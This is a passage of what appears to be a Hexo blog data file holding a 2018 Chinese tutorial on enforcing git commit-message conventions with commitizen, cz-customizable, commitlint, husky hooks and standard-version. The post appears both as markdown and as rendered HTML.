\"chore：对非业务性代码进行修改，例如包管理器,构建过程或辅助工具的变动\"\n    }\n  ],\n  // 按照项目模块, 自行配置\n  scopes: [{ name: \"品牌监测\" }, { name: \"活动监测\" }, { name: \"kol监测\" }],\n  // 可以根据匹配的类型不同, 显示不一样的scope,\n  scopeOverrides: {\n    fix: [{ name: \"merge\" }],\n    chore: []\n  },\n  allowCustomScopes: true,\n  //重要的改动要声明\n  allowBreakingChanges: [\"feat\", \"fix\"]\n};\n```\n\n- 在 package.json 下面添加\n\n```javascript\n{\n  \"config\": {\n    \"commitizen\": {\n      \"path\": \"node_modules/cz-customizable\"\n    }\n  }\n}\n```\n\n- `git commit`以后提交使用`git cz`\n\n# git hook 检查\n\n> 鉴于 vscode 有很方便的提交 git 的图形化按钮，有些童鞋可能会一不小心就提交了自己的信息\n\n- git 拥有提交工作流钩子（git hooks），我们在本地用 commit-msg 钩子搞事情～\n\n### commit-msg 钩子\n\n#### 简介\n\n- 它会在用户输入提交信息之后被调用。这适合用来提醒开发者他们的提交信息不符合团队的规范。\n\n#### 使用\n\n- 为了简化使用 git hook，这里直接使用了 husky 插件（继承了 git hook 所有钩子），让 hook 使用更简单～（npm i husky -D）\n\n##### 使用 ng 的提交规范\n\n- 安装`@commitlint/config-conventional`和`@commitlint/cli`（检查）\n- - 新建`.commitlintrc.js`,如下\n\n```javascript\n\"use strict\";\nmodule.exports = {\n  extends: [\"@commitlint/config-conventional\"],\n  rules: {}\n};\n```\n\n#### 针对自定义的 Adapter\n\n- 需要安装 `commitlint-config-cz`(自定义) 和`@commitlint/cli`（检查）\n- 新建`.commitlintrc.js`,如下\n\n```javascript\n\"use strict\";\nmodule.exports = {\n  extends: [\"cz\"],\n  rules: {}\n};\n```\n\n- package.json 里面添加\n\n```javascript\n\"husky\": {\n    \"hooks\": {\n      \"commit-msg\": \"commitlint -c -e $GIT_PARAMS\"\n    }\n  }\n```\n\n### 自动生成 CHANGELOG\n\n- 我们可以借助 `standard-version`(很多特性)这样的工具, 自动生成 CHANGELOG\n- npm i -S standard-version\n- package.json 里面添加\n\n```javascript\n\"script\": {\n    \"release\": \"standard-version\"\n}\n```\n\n- npm run release 生成 CHANGELOG\n","source":"_posts/commit-msg.md","raw":"---\ntitle: commit规范\ndate: 2018-10-19 16:20:54\ntags: git\n---\n\n# 背景\n\n> 团队如果采用 [Angular 的提交规范](https://github.com/isLishude/blog/issues/69)，有方便的插件，可放心食用。\n\n- 对 git commit -m \"不知道提交些什么\"——这样的 commit 说拒绝。\n- 生成易读的 commit，可以方便回退版本以及 code-review。\n\n# 使用说明\n\n### 第一种方式（并非自定义,使用 ng 团队）\n\n> 无法定义自己的模块/组件（scopes）,比如项目具体业务的页面\n\n- 确保全局安装或者该项目已经有了 commitizen ，命令：npm i -g commitizen / npm i -D commitizen\n- 查看 package.json，看看是否有 config 选项，并且里面 commitizen 选项，如果有则跳过第三个步骤。\n- 安装 `adapter` 配置 commit message，例如，要使用 Angular 的 commit message 格式，可以安装 `cz-conventional-changelog`，执行`commitizen init cz-conventional-changelog --save --save-exact`\n- `git commit`以后提交使用`git cz`\n\n### 第二钟方式\n\n> 自定义程度较高，可以有自己想要的模块\n\n- 确保全局安装或者该项目已经有了 commitizen 和 cz-customizable\n- 查看 package.json，看看是否有 config 选项，并且里面 commitizen 选项，如果有则跳过第三个步骤。\n- 该项目下手动新建`.cz-config.js`文件，如下\n\n```javascript\n\"use strict\";\nmodule.exports = {\n  // 不要更改types, 只允许出现这几种\n  types: [\n    {\n      value: \"wip\",\n      name: \"wip：大版本功能开发阶段性提交\"\n    },\n    { value: \"feat\", name: \"feat：完整新功能提交\" },\n    { value: \"fix\", name: \"fix：修复bug\" },\n    {\n      value: \"build\",\n      name: \"build：打包，准备发布\"\n    },\n    { value: \"docs\", name: \"docs：只修改了文档相关的文件，例如修改README.md\" },\n    {\n      value: \"style\",\n      name:\n        \"style：代码风格、不影响代码功能的更改，例如修改空格缩进，换行规范等n\"\n    },\n    {\n      value: \"refactor\",\n      name: \"refactor：既不修复错误也不添加新功能的代码更改，例如重构\"\n    },\n    {\n      value: \"chore\",\n      name:\n        \"chore：对非业务性代码进行修改，例如包管理器,构建过程或辅助工具的变动\"\n    }\n  ],\n  // 按照项目模块, 自行配置\n  scopes: [{ name: \"品牌监测\" }, { name: \"活动监测\" }, { name: \"kol监测\" }],\n  // 可以根据匹配的类型不同, 显示不一样的scope,\n  scopeOverrides: {\n    fix: [{ name: \"merge\" }],\n    chore: []\n  },\n  allowCustomScopes: true,\n  //重要的改动要声明\n  allowBreakingChanges: [\"feat\", \"fix\"]\n};\n```\n\n- 在 package.json 下面添加\n\n```javascript\n{\n  \"config\": {\n    \"commitizen\": {\n      \"path\": \"node_modules/cz-customizable\"\n    }\n  }\n}\n```\n\n- `git commit`以后提交使用`git cz`\n\n# git hook 检查\n\n> 鉴于 vscode 有很方便的提交 git 的图形化按钮，有些童鞋可能会一不小心就提交了自己的信息\n\n- git 拥有提交工作流钩子（git hooks），我们在本地用 commit-msg 钩子搞事情～\n\n### commit-msg 钩子\n\n#### 简介\n\n- 它会在用户输入提交信息之后被调用。这适合用来提醒开发者他们的提交信息不符合团队的规范。\n\n#### 使用\n\n- 为了简化使用 git hook，这里直接使用了 husky 插件（继承了 git hook 所有钩子），让 hook 使用更简单～（npm i husky -D）\n\n##### 使用 ng 的提交规范\n\n- 安装`@commitlint/config-conventional`和`@commitlint/cli`（检查）\n- - 新建`.commitlintrc.js`,如下\n\n```javascript\n\"use strict\";\nmodule.exports = {\n  extends: [\"@commitlint/config-conventional\"],\n  rules: {}\n};\n```\n\n#### 针对自定义的 Adapter\n\n- 需要安装 `commitlint-config-cz`(自定义) 和`@commitlint/cli`（检查）\n- 新建`.commitlintrc.js`,如下\n\n```javascript\n\"use strict\";\nmodule.exports = {\n  extends: [\"cz\"],\n  rules: {}\n};\n```\n\n- package.json 里面添加\n\n```javascript\n\"husky\": {\n    \"hooks\": {\n      \"commit-msg\": \"commitlint -c -e $GIT_PARAMS\"\n    }\n  }\n```\n\n### 自动生成 CHANGELOG\n\n- 我们可以借助 `standard-version`(很多特性)这样的工具, 自动生成 CHANGELOG\n- npm i -S standard-version\n- package.json 里面添加\n\n```javascript\n\"script\": {\n    \"release\": \"standard-version\"\n}\n```\n\n- npm run release 生成 CHANGELOG\n","slug":"commit-msg","published":1,"updated":"2018-11-20T06:48:51.276Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034jo000b0iofs11f1xn2","content":"<h1 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h1><blockquote>\n<p>团队如果采用 <a href=\"https://github.com/isLishude/blog/issues/69\" target=\"_blank\" rel=\"noopener\">Angular 的提交规范</a>，有方便的插件，可放心食用。</p>\n</blockquote>\n<ul>\n<li>对 git commit -m “不知道提交些什么”——这样的 commit 说拒绝。</li>\n<li>生成易读的 commit，可以方便回退版本以及 code-review。</li>\n</ul>\n<h1 id=\"使用说明\"><a href=\"#使用说明\" class=\"headerlink\" title=\"使用说明\"></a>使用说明</h1><h3 id=\"第一种方式（并非自定义-使用-ng-团队）\"><a href=\"#第一种方式（并非自定义-使用-ng-团队）\" class=\"headerlink\" title=\"第一种方式（并非自定义,使用 ng 团队）\"></a>第一种方式（并非自定义,使用 ng 团队）</h3><blockquote>\n<p>无法定义自己的模块/组件（scopes）,比如项目具体业务的页面</p>\n</blockquote>\n<ul>\n<li>确保全局安装或者该项目已经有了 commitizen ，命令：npm i -g commitizen / npm i -D commitizen</li>\n<li>查看 package.json，看看是否有 config 选项，并且里面 commitizen 选项，如果有则跳过第三个步骤。</li>\n<li>安装 <code>adapter</code> 配置 commit message，例如，要使用 Angular 的 commit message 格式，可以安装 <code>cz-conventional-changelog</code>，执行<code>commitizen init cz-conventional-changelog --save --save-exact</code></li>\n<li><code>git commit</code>以后提交使用<code>git cz</code></li>\n</ul>\n<h3 id=\"第二钟方式\"><a href=\"#第二钟方式\" class=\"headerlink\" title=\"第二钟方式\"></a>第二钟方式</h3><blockquote>\n<p>自定义程度较高，可以有自己想要的模块</p>\n</blockquote>\n<ul>\n<li>确保全局安装或者该项目已经有了 commitizen 和 cz-customizable</li>\n<li>查看 package.json，看看是否有 config 选项，并且里面 commitizen 选项，如果有则跳过第三个步骤。</li>\n<li>该项目下手动新建<code>.cz-config.js</code>文件，如下</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">\"use strict\"</span>;</span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  <span class=\"comment\">// 不要更改types, 只允许出现这几种</span></span><br><span class=\"line\">  types: [</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      value: <span class=\"string\">\"wip\"</span>,</span><br><span class=\"line\">      name: <span class=\"string\">\"wip：大版本功能开发阶段性提交\"</span></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123; <span class=\"attr\">value</span>: <span class=\"string\">\"feat\"</span>, <span class=\"attr\">name</span>: <span class=\"string\">\"feat：完整新功能提交\"</span> &#125;,</span><br><span class=\"line\">    &#123; <span class=\"attr\">value</span>: <span class=\"string\">\"fix\"</span>, <span class=\"attr\">name</span>: <span class=\"string\">\"fix：修复bug\"</span> &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      value: <span class=\"string\">\"build\"</span>,</span><br><span class=\"line\">      name: <span class=\"string\">\"build：打包，准备发布\"</span></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123; <span class=\"attr\">value</span>: <span class=\"string\">\"docs\"</span>, <span class=\"attr\">name</span>: <span class=\"string\">\"docs：只修改了文档相关的文件，例如修改README.md\"</span> &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      value: <span class=\"string\">\"style\"</span>,</span><br><span class=\"line\">      name:</span><br><span class=\"line\">        <span class=\"string\">\"style：代码风格、不影响代码功能的更改，例如修改空格缩进，换行规范等n\"</span></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      value: <span class=\"string\">\"refactor\"</span>,</span><br><span class=\"line\">      name: <span class=\"string\">\"refactor：既不修复错误也不添加新功能的代码更改，例如重构\"</span></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      value: <span class=\"string\">\"chore\"</span>,</span><br><span class=\"line\">      name:</span><br><span class=\"line\">        <span class=\"string\">\"chore：对非业务性代码进行修改，例如包管理器,构建过程或辅助工具的变动\"</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  ],</span><br><span class=\"line\">  <span class=\"comment\">// 按照项目模块, 自行配置</span></span><br><span class=\"line\">  scopes: [&#123; <span class=\"attr\">name</span>: <span class=\"string\">\"品牌监测\"</span> &#125;, &#123; <span class=\"attr\">name</span>: <span class=\"string\">\"活动监测\"</span> &#125;, &#123; <span class=\"attr\">name</span>: <span class=\"string\">\"kol监测\"</span> &#125;],</span><br><span class=\"line\">  <span class=\"comment\">// 可以根据匹配的类型不同, 显示不一样的scope,</span></span><br><span class=\"line\">  scopeOverrides: &#123;</span><br><span class=\"line\">    fix: [&#123; <span class=\"attr\">name</span>: <span class=\"string\">\"merge\"</span> &#125;],</span><br><span class=\"line\">    chore: []</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  allowCustomScopes: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"comment\">//重要的改动要声明</span></span><br><span class=\"line\">  allowBreakingChanges: [<span class=\"string\">\"feat\"</span>, <span class=\"string\">\"fix\"</span>]</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>在 package.json 下面添加</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"string\">\"config\"</span>: &#123;</span><br><span class=\"line\">    <span class=\"string\">\"commitizen\"</span>: &#123;</span><br><span class=\"line\">      <span class=\"string\">\"path\"</span>: <span class=\"string\">\"node_modules/cz-customizable\"</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li><code>git commit</code>以后提交使用<code>git cz</code></li>\n</ul>\n<h1 id=\"git-hook-检查\"><a href=\"#git-hook-检查\" class=\"headerlink\" title=\"git hook 检查\"></a>git hook 检查</h1><blockquote>\n<p>鉴于 vscode 有很方便的提交 git 的图形化按钮，有些童鞋可能会一不小心就提交了自己的信息</p>\n</blockquote>\n<ul>\n<li>git 拥有提交工作流钩子（git hooks），我们在本地用 commit-msg 钩子搞事情～</li>\n</ul>\n<h3 id=\"commit-msg-钩子\"><a href=\"#commit-msg-钩子\" class=\"headerlink\" title=\"commit-msg 钩子\"></a>commit-msg 钩子</h3><h4 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h4><ul>\n<li>它会在用户输入提交信息之后被调用。这适合用来提醒开发者他们的提交信息不符合团队的规范。</li>\n</ul>\n<h4 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h4><ul>\n<li>为了简化使用 git hook，这里直接使用了 husky 插件（继承了 git hook 所有钩子），让 hook 使用更简单～（npm i husky -D）</li>\n</ul>\n<h5 id=\"使用-ng-的提交规范\"><a href=\"#使用-ng-的提交规范\" class=\"headerlink\" title=\"使用 ng 的提交规范\"></a>使用 ng 的提交规范</h5><ul>\n<li>安装<code>@commitlint/config-conventional</code>和<code>@commitlint/cli</code>（检查）</li>\n<li><ul>\n<li>新建<code>.commitlintrc.js</code>,如下</li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">\"use strict\"</span>;</span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  extends: [<span class=\"string\">\"@commitlint/config-conventional\"</span>],</span><br><span class=\"line\">  rules: &#123;&#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h4 id=\"针对自定义的-Adapter\"><a href=\"#针对自定义的-Adapter\" class=\"headerlink\" title=\"针对自定义的 Adapter\"></a>针对自定义的 Adapter</h4><ul>\n<li>需要安装 <code>commitlint-config-cz</code>(自定义) 和<code>@commitlint/cli</code>（检查）</li>\n<li>新建<code>.commitlintrc.js</code>,如下</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">\"use strict\"</span>;</span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  extends: [<span class=\"string\">\"cz\"</span>],</span><br><span class=\"line\">  rules: &#123;&#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>package.json 里面添加</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">\"husky\"</span>: &#123;</span><br><span class=\"line\">    <span class=\"string\">\"hooks\"</span>: &#123;</span><br><span class=\"line\">      <span class=\"string\">\"commit-msg\"</span>: <span class=\"string\">\"commitlint -c -e $GIT_PARAMS\"</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"自动生成-CHANGELOG\"><a href=\"#自动生成-CHANGELOG\" class=\"headerlink\" title=\"自动生成 CHANGELOG\"></a>自动生成 CHANGELOG</h3><ul>\n<li>我们可以借助 <code>standard-version</code>(很多特性)这样的工具, 自动生成 CHANGELOG</li>\n<li>npm i -S standard-version</li>\n<li>package.json 里面添加</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">\"script\"</span>: &#123;</span><br><span class=\"line\">    <span class=\"string\">\"release\"</span>: <span class=\"string\">\"standard-version\"</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>npm run release 生成 CHANGELOG</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h1><blockquote>\n<p>团队如果采用 <a href=\"https://github.com/isLishude/blog/issues/69\" target=\"_blank\" rel=\"noopener\">Angular 的提交规范</a>，有方便的插件，可放心食用。</p>\n</blockquote>\n<ul>\n<li>对 git commit -m “不知道提交些什么”——这样的 commit 说拒绝。</li>\n<li>生成易读的 commit，可以方便回退版本以及 code-review。</li>\n</ul>\n<h1 id=\"使用说明\"><a href=\"#使用说明\" class=\"headerlink\" title=\"使用说明\"></a>使用说明</h1><h3 id=\"第一种方式（并非自定义-使用-ng-团队）\"><a href=\"#第一种方式（并非自定义-使用-ng-团队）\" class=\"headerlink\" title=\"第一种方式（并非自定义,使用 ng 团队）\"></a>第一种方式（并非自定义,使用 ng 团队）</h3><blockquote>\n<p>无法定义自己的模块/组件（scopes）,比如项目具体业务的页面</p>\n</blockquote>\n<ul>\n<li>确保全局安装或者该项目已经有了 commitizen ，命令：npm i -g commitizen / npm i -D commitizen</li>\n<li>查看 package.json，看看是否有 config 选项，并且里面 commitizen 选项，如果有则跳过第三个步骤。</li>\n<li>安装 <code>adapter</code> 配置 commit message，例如，要使用 Angular 的 commit message 格式，可以安装 <code>cz-conventional-changelog</code>，执行<code>commitizen init cz-conventional-changelog --save --save-exact</code></li>\n<li><code>git commit</code>以后提交使用<code>git cz</code></li>\n</ul>\n<h3 id=\"第二钟方式\"><a href=\"#第二钟方式\" class=\"headerlink\" title=\"第二钟方式\"></a>第二钟方式</h3><blockquote>\n<p>自定义程度较高，可以有自己想要的模块</p>\n</blockquote>\n<ul>\n<li>确保全局安装或者该项目已经有了 commitizen 和 cz-customizable</li>\n<li>查看 package.json，看看是否有 config 选项，并且里面 commitizen 选项，如果有则跳过第三个步骤。</li>\n<li>该项目下手动新建<code>.cz-config.js</code>文件，如下</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">\"use strict\"</span>;</span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  <span class=\"comment\">// 不要更改types, 只允许出现这几种</span></span><br><span class=\"line\">  types: [</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      value: <span class=\"string\">\"wip\"</span>,</span><br><span class=\"line\">      name: <span class=\"string\">\"wip：大版本功能开发阶段性提交\"</span></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123; <span class=\"attr\">value</span>: <span class=\"string\">\"feat\"</span>, <span class=\"attr\">name</span>: <span class=\"string\">\"feat：完整新功能提交\"</span> &#125;,</span><br><span class=\"line\">    &#123; <span class=\"attr\">value</span>: <span class=\"string\">\"fix\"</span>, <span class=\"attr\">name</span>: <span class=\"string\">\"fix：修复bug\"</span> &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      value: <span class=\"string\">\"build\"</span>,</span><br><span class=\"line\">      name: <span class=\"string\">\"build：打包，准备发布\"</span></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123; <span class=\"attr\">value</span>: <span class=\"string\">\"docs\"</span>, <span class=\"attr\">name</span>: <span class=\"string\">\"docs：只修改了文档相关的文件，例如修改README.md\"</span> &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      value: <span class=\"string\">\"style\"</span>,</span><br><span class=\"line\">      name:</span><br><span class=\"line\">        <span class=\"string\">\"style：代码风格、不影响代码功能的更改，例如修改空格缩进，换行规范等n\"</span></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      value: <span class=\"string\">\"refactor\"</span>,</span><br><span class=\"line\">      name: <span class=\"string\">\"refactor：既不修复错误也不添加新功能的代码更改，例如重构\"</span></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      value: <span class=\"string\">\"chore\"</span>,</span><br><span class=\"line\">      name:</span><br><span class=\"line\">        <span class=\"string\">\"chore：对非业务性代码进行修改，例如包管理器,构建过程或辅助工具的变动\"</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  ],</span><br><span class=\"line\">  <span class=\"comment\">// 按照项目模块, 自行配置</span></span><br><span class=\"line\">  scopes: [&#123; <span class=\"attr\">name</span>: <span class=\"string\">\"品牌监测\"</span> &#125;, &#123; <span class=\"attr\">name</span>: <span class=\"string\">\"活动监测\"</span> &#125;, &#123; <span class=\"attr\">name</span>: <span class=\"string\">\"kol监测\"</span> &#125;],</span><br><span class=\"line\">  <span class=\"comment\">// 可以根据匹配的类型不同, 显示不一样的scope,</span></span><br><span class=\"line\">  scopeOverrides: &#123;</span><br><span class=\"line\">    fix: [&#123; <span class=\"attr\">name</span>: <span class=\"string\">\"merge\"</span> &#125;],</span><br><span class=\"line\">    chore: []</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  allowCustomScopes: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"comment\">//重要的改动要声明</span></span><br><span class=\"line\">  allowBreakingChanges: [<span class=\"string\">\"feat\"</span>, <span class=\"string\">\"fix\"</span>]</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>在 package.json 下面添加</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"string\">\"config\"</span>: &#123;</span><br><span class=\"line\">    <span class=\"string\">\"commitizen\"</span>: &#123;</span><br><span class=\"line\">      <span class=\"string\">\"path\"</span>: <span class=\"string\">\"node_modules/cz-customizable\"</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li><code>git commit</code>以后提交使用<code>git cz</code></li>\n</ul>\n<h1 id=\"git-hook-检查\"><a href=\"#git-hook-检查\" class=\"headerlink\" title=\"git hook 检查\"></a>git hook 检查</h1><blockquote>\n<p>鉴于 vscode 有很方便的提交 git 的图形化按钮，有些童鞋可能会一不小心就提交了自己的信息</p>\n</blockquote>\n<ul>\n<li>git 拥有提交工作流钩子（git hooks），我们在本地用 commit-msg 钩子搞事情～</li>\n</ul>\n<h3 id=\"commit-msg-钩子\"><a href=\"#commit-msg-钩子\" class=\"headerlink\" title=\"commit-msg 钩子\"></a>commit-msg 钩子</h3><h4 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h4><ul>\n<li>它会在用户输入提交信息之后被调用。这适合用来提醒开发者他们的提交信息不符合团队的规范。</li>\n</ul>\n<h4 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h4><ul>\n<li>为了简化使用 git hook，这里直接使用了 husky 插件（继承了 git hook 所有钩子），让 hook 使用更简单～（npm i husky -D）</li>\n</ul>\n<h5 id=\"使用-ng-的提交规范\"><a href=\"#使用-ng-的提交规范\" class=\"headerlink\" title=\"使用 ng 的提交规范\"></a>使用 ng 的提交规范</h5><ul>\n<li>安装<code>@commitlint/config-conventional</code>和<code>@commitlint/cli</code>（检查）</li>\n<li><ul>\n<li>新建<code>.commitlintrc.js</code>,如下</li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">\"use strict\"</span>;</span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  extends: [<span class=\"string\">\"@commitlint/config-conventional\"</span>],</span><br><span class=\"line\">  rules: &#123;&#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h4 id=\"针对自定义的-Adapter\"><a href=\"#针对自定义的-Adapter\" class=\"headerlink\" title=\"针对自定义的 Adapter\"></a>针对自定义的 Adapter</h4><ul>\n<li>需要安装 <code>commitlint-config-cz</code>(自定义) 和<code>@commitlint/cli</code>（检查）</li>\n<li>新建<code>.commitlintrc.js</code>,如下</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">\"use strict\"</span>;</span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  extends: [<span class=\"string\">\"cz\"</span>],</span><br><span class=\"line\">  rules: &#123;&#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>package.json 里面添加</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">\"husky\"</span>: &#123;</span><br><span class=\"line\">    <span class=\"string\">\"hooks\"</span>: &#123;</span><br><span class=\"line\">      <span class=\"string\">\"commit-msg\"</span>: <span class=\"string\">\"commitlint -c -e $GIT_PARAMS\"</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"自动生成-CHANGELOG\"><a href=\"#自动生成-CHANGELOG\" class=\"headerlink\" title=\"自动生成 CHANGELOG\"></a>自动生成 CHANGELOG</h3><ul>\n<li>我们可以借助 <code>standard-version</code>(很多特性)这样的工具, 自动生成 CHANGELOG</li>\n<li>npm i -S standard-version</li>\n<li>package.json 里面添加</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span 